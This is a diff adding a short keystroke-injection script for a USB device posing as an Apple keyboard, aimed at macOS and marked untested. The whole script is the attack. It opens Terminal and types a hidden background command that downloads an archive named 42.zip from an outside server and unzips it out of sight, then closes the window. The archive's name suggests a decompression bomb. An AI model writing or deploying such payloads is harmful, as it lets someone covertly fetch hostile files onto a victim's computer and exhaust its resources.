@@ -1,0 +1,19 @@
+REM FalsePhilosopher
+REM Target osx untested
+ID 05ac:021e Apple:Keyboard
+DELAY 300
+COMMAND SPACE
+DELAY 300
+STRING terminal.app
+DELAY 200
+ENTER
+DELAY 500
+STRING nohup wget https://www.lostserver.com/static/42.zip >/dev/null  &&  unzip 42.zip >/dev/null &
+DELAY 300
+ENTER
+DELAY 500
+CTRL C
+DELAY 300
+STRING exit
+DELAY 200
+ENTER
